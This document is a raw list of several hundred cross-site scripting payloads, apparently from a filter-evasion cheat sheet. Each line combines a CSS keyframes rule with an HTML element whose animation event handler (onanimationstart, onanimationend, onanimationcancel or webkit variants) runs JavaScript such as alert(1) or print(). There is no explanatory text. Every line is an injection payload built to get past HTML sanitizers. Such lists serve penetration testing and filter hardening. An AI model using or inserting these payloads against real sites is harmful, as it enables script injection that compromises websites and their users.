<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style="position:absolute;" onanimationcancel="print()"></caption>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style="position:absolute;" onanimationcancel="print()"></center>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style="position:absolute;" onanimationcancel="print()"></cite>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style="position:absolute;" onanimationcancel="print()"></code>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style="position:absolute;" onanimationcancel="print()"></col>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style="position:absolute;" onanimationcancel="print()"></colgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style="position:absolute;" onanimationcancel="print()"></command>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style="position:absolute;" onanimationcancel="print()"></content>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><custom tags id=x style="position:absolute;" onanimationcancel="print()"></custom tags>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style="position:absolute;" onanimationcancel="print()"></data>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style="position:absolute;" onanimationcancel="print()"></datalist>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style="position:absolute;" onanimationcancel="print()"></dd>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style="position:absolute;" onanimationcancel="print()"></del>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style="position:absolute;" onanimationcancel="print()"></details>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style="position:absolute;" onanimationcancel="print()"></dfn>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style="position:absolute;" onanimationcancel="print()"></dialog>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style="position:absolute;" onanimationcancel="print()"></dir>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style="position:absolute;" onanimationcancel="print()"></div>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style="position:absolute;" onanimationcancel="print()"></dl>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style="position:absolute;" onanimationcancel="print()"></dt>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style="position:absolute;" onanimationcancel="print()"></element>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style="position:absolute;" onanimationcancel="print()"></em>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style="position:absolute;" onanimationcancel="print()"></embed>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style="position:absolute;" onanimationcancel="print()"></fieldset>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style="position:absolute;" onanimationcancel="print()"></figcaption>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style="position:absolute;" onanimationcancel="print()"></figure>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style="position:absolute;" onanimationcancel="print()"></font>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style="position:absolute;" onanimationcancel="print()"></footer>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style="position:absolute;" onanimationcancel="print()"></form>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style="position:absolute;" onanimationcancel="print()"></frame>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style="position:absolute;" onanimationcancel="print()"></frameset>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style="position:absolute;" onanimationcancel="print()"></h1>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style="position:absolute;" onanimationcancel="print()"></head>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style="position:absolute;" onanimationcancel="print()"></header>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style="position:absolute;" onanimationcancel="print()"></hgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style="position:absolute;" onanimationcancel="print()"></hr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style="position:absolute;" onanimationcancel="print()"></html>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style="position:absolute;" onanimationcancel="print()"></i>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style="position:absolute;" onanimationcancel="print()"></iframe>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe2 id=x style="position:absolute;" onanimationcancel="print()"></iframe2>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style="position:absolute;" onanimationcancel="print()"></image>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image2 id=x style="position:absolute;" onanimationcancel="print()"></image2>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style="position:absolute;" onanimationcancel="print()"></image3>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style="position:absolute;" onanimationcancel="print()"></img>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img2 id=x style="position:absolute;" onanimationcancel="print()"></img2>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style="position:absolute;" onanimationcancel="print()"></input>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input2 id=x style="position:absolute;" onanimationcancel="print()"></input2>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input3 id=x style="position:absolute;" onanimationcancel="print()"></input3>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input4 id=x style="position:absolute;" onanimationcancel="print()"></input4>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style="position:absolute;" onanimationcancel="print()"></ins>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style="position:absolute;" onanimationcancel="print()"></kbd>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style="position:absolute;" onanimationcancel="print()"></keygen>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style="position:absolute;" onanimationcancel="print()"></label>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style="position:absolute;" onanimationcancel="print()"></legend>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style="position:absolute;" onanimationcancel="print()"></li>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style="position:absolute;" onanimationcancel="print()"></link>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style="position:absolute;" onanimationcancel="print()"></listing>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style="position:absolute;" onanimationcancel="print()"></main>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style="position:absolute;" onanimationcancel="print()"></map>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style="position:absolute;" onanimationcancel="print()"></mark>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style="position:absolute;" onanimationcancel="print()"></marquee>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style="position:absolute;" onanimationcancel="print()"></menu>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style="position:absolute;" onanimationcancel="print()"></menuitem>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style="position:absolute;" onanimationcancel="print()"></meta>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style="position:absolute;" onanimationcancel="print()"></meter>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style="position:absolute;" onanimationcancel="print()"></multicol>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style="position:absolute;" onanimationcancel="print()"></nav>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style="position:absolute;" onanimationcancel="print()"></nextid>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style="position:absolute;" onanimationcancel="print()"></nobr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style="position:absolute;" onanimationcancel="print()"></noembed>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style="position:absolute;" onanimationcancel="print()"></noframes>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style="position:absolute;" onanimationcancel="print()"></noscript>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style="position:absolute;" onanimationcancel="print()"></object>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style="position:absolute;" onanimationcancel="print()"></ol>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style="position:absolute;" onanimationcancel="print()"></optgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style="position:absolute;" onanimationcancel="print()"></option>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style="position:absolute;" onanimationcancel="print()"></output>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style="position:absolute;" onanimationcancel="print()"></p>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style="position:absolute;" onanimationcancel="print()"></param>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style="position:absolute;" onanimationcancel="print()"></picture>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style="position:absolute;" onanimationcancel="print()"></plaintext>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style="position:absolute;" onanimationcancel="print()"></pre>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style="position:absolute;" onanimationcancel="print()"></progress>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style="position:absolute;" onanimationcancel="print()"></q>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style="position:absolute;" onanimationcancel="print()"></rb>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style="position:absolute;" onanimationcancel="print()"></rp>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style="position:absolute;" onanimationcancel="print()"></rt>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style="position:absolute;" onanimationcancel="print()"></rtc>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style="position:absolute;" onanimationcancel="print()"></ruby>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style="position:absolute;" onanimationcancel="print()"></s>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style="position:absolute;" onanimationcancel="print()"></samp>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style="position:absolute;" onanimationcancel="print()"></script>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style="position:absolute;" onanimationcancel="print()"></section>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style="position:absolute;" onanimationcancel="print()"></select>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><set id=x style="position:absolute;" onanimationcancel="print()"></set>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style="position:absolute;" onanimationcancel="print()"></shadow>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style="position:absolute;" onanimationcancel="print()"></slot>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style="position:absolute;" onanimationcancel="print()"></small>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style="position:absolute;" onanimationcancel="print()"></source>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style="position:absolute;" onanimationcancel="print()"></spacer>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style="position:absolute;" onanimationcancel="print()"></span>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strike id=x style="position:absolute;" onanimationcancel="print()"></strike>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style="position:absolute;" onanimationcancel="print()"></strong>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style="position:absolute;" onanimationcancel="print()"></style>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="print()"></sub>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style="position:absolute;" onanimationcancel="print()"></summary>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style="position:absolute;" onanimationcancel="print()"></sup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style="position:absolute;" onanimationcancel="print()"></svg>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style="position:absolute;" onanimationcancel="print()"></table>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style="position:absolute;" onanimationcancel="print()"></tbody>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style="position:absolute;" onanimationcancel="print()"></td>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style="position:absolute;" onanimationcancel="print()"></template>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style="position:absolute;" onanimationcancel="print()"></textarea>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style="position:absolute;" onanimationcancel="print()"></tfoot>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style="position:absolute;" onanimationcancel="print()"></th>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style="position:absolute;" onanimationcancel="print()"></thead>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style="position:absolute;" onanimationcancel="print()"></time>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style="position:absolute;" onanimationcancel="print()"></title>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style="position:absolute;" onanimationcancel="print()"></tr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style="position:absolute;" onanimationcancel="print()"></track>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style="position:absolute;" onanimationcancel="print()"></tt>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style="position:absolute;" onanimationcancel="print()"></u>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style="position:absolute;" onanimationcancel="print()"></ul>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style="position:absolute;" onanimationcancel="print()"></var>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style="position:absolute;" onanimationcancel="print()"></video>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video2 id=x style="position:absolute;" onanimationcancel="print()"></video2>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="print()"></wbr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="print()"></xmp>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>
<style>@keyframes x{}</style><a style="animation-name:x" onwebkitanimationend="alert(1)"></a>
<style>@keyframes x{}</style><a style="animation-name:x" onwebkitanimationstart="alert(1)"></a>
<style>@keyframes x{}</style><a2 style="animation-name:x" onanimationend="alert(1)"></a2>
<style>@keyframes x{}</style><a2 style="animation-name:x" onanimationstart="alert(1)"></a2>
<style>@keyframes x{}</style><a2 style="animation-name:x" onwebkitanimationend="alert(1)"></a2>
<style>@keyframes x{}</style><a2 style="animation-name:x" onwebkitanimationstart="alert(1)"></a2>
<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationend="alert(1)"></abbr>
<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationstart="alert(1)"></abbr>
<style>@keyframes x{}</style><abbr style="animation-name:x" onwebkitanimationend="alert(1)"></abbr>
<style>@keyframes x{}</style><abbr style="animation-name:x" onwebkitanimationstart="alert(1)"></abbr>
<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationend="alert(1)"></acronym>
<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationstart="alert(1)"></acronym>
<style>@keyframes x{}</style><acronym style="animation-name:x" onwebkitanimationend="alert(1)"></acronym>
<style>@keyframes x{}</style><acronym style="animation-name:x" onwebkitanimationstart="alert(1)"></acronym>
<style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
<style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
<style>@keyframes x{}</style><address style="animation-name:x" onwebkitanimationend="alert(1)"></address>
<style>@keyframes x{}</style><address style="animation-name:x" onwebkitanimationstart="alert(1)"></address>
<style>@keyframes x{}</style><animate style="animation-name:x" onanimationend="alert(1)"></animate>
<style>@keyframes x{}</style><animate style="animation-name:x" onanimationstart="alert(1)"></animate>
<style>@keyframes x{}</style><animate style="animation-name:x" onwebkitanimationend="alert(1)"></animate>
<style>@keyframes x{}</style><animate style="animation-name:x" onwebkitanimationstart="alert(1)"></animate>
<style>@keyframes x{}</style><animatemotion style="animation-name:x" onanimationend="alert(1)"></animatemotion>
<style>@keyframes x{}</style><animatemotion style="animation-name:x" onanimationstart="alert(1)"></animatemotion>
<style>@keyframes x{}</style><animatemotion style="animation-name:x" onwebkitanimationend="alert(1)"></animatemotion>
<style>@keyframes x{}</style><animatemotion style="animation-name:x" onwebkitanimationstart="alert(1)"></animatemotion>
<style>@keyframes x{}</style><animatetransform style="animation-name:x" onanimationend="alert(1)"></animatetransform>
<style>@keyframes x{}</style><animatetransform style="animation-name:x" onanimationstart="alert(1)"></animatetransform>
<style>@keyframes x{}</style><animatetransform style="animation-name:x" onwebkitanimationend="alert(1)"></animatetransform>
<style>@keyframes x{}</style><animatetransform style="animation-name:x" onwebkitanimationstart="alert(1)"></animatetransform>
<style>@keyframes x{}</style><applet style="animation-name:x" onanimationend="alert(1)"></applet>
<style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
<style>@keyframes x{}</style><applet style="animation-name:x" onwebkitanimationend="alert(1)"></applet>
<style>@keyframes x{}</style><applet style="animation-name:x" onwebkitanimationstart="alert(1)"></applet>
<style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>
<style>@keyframes x{}</style><area style="animation-name:x" onanimationstart="alert(1)"></area>
<style>@keyframes x{}</style><area style="animation-name:x" onwebkitanimationend="alert(1)"></area>
<style>@keyframes x{}</style><area style="animation-name:x" onwebkitanimationstart="alert(1)"></area>
<style>@keyframes x{}</style><article style="animation-name:x" onanimationend="alert(1)"></article>
<style>@keyframes x{}</style><article style="animation-name:x" onanimationstart="alert(1)"></article>
<style>@keyframes x{}</style><article style="animation-name:x" onwebkitanimationend="alert(1)"></article>
<style>@keyframes x{}</style><article style="animation-name:x" onwebkitanimationstart="alert(1)"></article>
<style>@keyframes x{}</style><aside style="animation-name:x" onanimationend="alert(1)"></aside>
<style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
<style>@keyframes x{}</style><aside style="animation-name:x" onwebkitanimationend="alert(1)"></aside>
<style>@keyframes x{}</style><aside style="animation-name:x" onwebkitanimationstart="alert(1)"></aside>
<style>@keyframes x{}</style><audio style="animation-name:x" onanimationend="alert(1)"></audio>
<style>@keyframes x{}</style><audio style="animation-name:x" onanimationstart="alert(1)"></audio>
<style>@keyframes x{}</style><audio style="animation-name:x" onwebkitanimationend="alert(1)"></audio>
<style>@keyframes x{}</style><audio style="animation-name:x" onwebkitanimationstart="alert(1)"></audio>
<style>@keyframes x{}</style><audio2 style="animation-name:x" onanimationend="alert(1)"></audio2>
<style>@keyframes x{}</style><audio2 style="animation-name:x" onanimationstart="alert(1)"></audio2>
<style>@keyframes x{}</style><audio2 style="animation-name:x" onwebkitanimationend="alert(1)"></audio2>
<style>@keyframes x{}</style><audio2 style="animation-name:x" onwebkitanimationstart="alert(1)"></audio2>
<style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationend="alert(1)"></b>
<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="alert(1)"></b>
<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationend="alert(1)"></bdi>
<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationstart="alert(1)"></bdi>
<style>@keyframes x{}</style><bdi style="animation-name:x" onwebkitanimationend="alert(1)"></bdi>
<style>@keyframes x{}</style><bdi style="animation-name:x" onwebkitanimationstart="alert(1)"></bdi>
<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>
<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationstart="alert(1)"></bdo>
<style>@keyframes x{}</style><bdo style="animation-name:x" onwebkitanimationend="alert(1)"></bdo>
<style>@keyframes x{}</style><bdo style="animation-name:x" onwebkitanimationstart="alert(1)"></bdo>
<style>@keyframes x{}</style><big style="animation-name:x" onanimationend="alert(1)"></big>
<style>@keyframes x{}</style><big style="animation-name:x" onanimationstart="alert(1)"></big>
<style>@keyframes x{}</style><big style="animation-name:x" onwebkitanimationend="alert(1)"></big>
<style>@keyframes x{}</style><big style="animation-name:x" onwebkitanimationstart="alert(1)"></big>
<style>@keyframes x{}</style><blink style="animation-name:x" onanimationend="alert(1)"></blink>
<style>@keyframes x{}</style><blink style="animation-name:x" onanimationstart="alert(1)"></blink>
<style>@keyframes x{}</style><blink style="animation-name:x" onwebkitanimationend="alert(1)"></blink>
<style>@keyframes x{}</style><blink style="animation-name:x" onwebkitanimationstart="alert(1)"></blink>
<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationend="alert(1)"></blockquote>
<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationstart="alert(1)"></blockquote>
<style>@keyframes x{}</style><blockquote style="animation-name:x" onwebkitanimationend="alert(1)"></blockquote>
<style>@keyframes x{}</style><blockquote style="animation-name:x" onwebkitanimationstart="alert(1)"></blockquote>
<style>@keyframes x{}</style><body style="animation-name:x" onanimationend="alert(1)"></body>
<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
<style>@keyframes x{}</style><body style="animation-name:x" onwebkitanimationend="alert(1)"></body>
<style>@keyframes x{}</style><body style="animation-name:x" onwebkitanimationstart="alert(1)"></body>
<style>@keyframes x{}</style><br style="animation-name:x" onanimationend="alert(1)"></br>
<style>@keyframes x{}</style><br style="animation-name:x" onanimationstart="alert(1)"></br>
<style>@keyframes x{}</style><br style="animation-name:x" onwebkitanimationend="alert(1)"></br>
<style>@keyframes x{}</style><br style="animation-name:x" onwebkitanimationstart="alert(1)"></br>
<style>@keyframes x{}</style><button style="animation-name:x" onanimationend="alert(1)"></button>
<style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
<style>@keyframes x{}</style><button style="animation-name:x" onwebkitanimationend="alert(1)"></button>
<style>@keyframes x{}</style><button style="animation-name:x" onwebkitanimationstart="alert(1)"></button>
<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationend="alert(1)"></canvas>
<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationstart="alert(1)"></canvas>
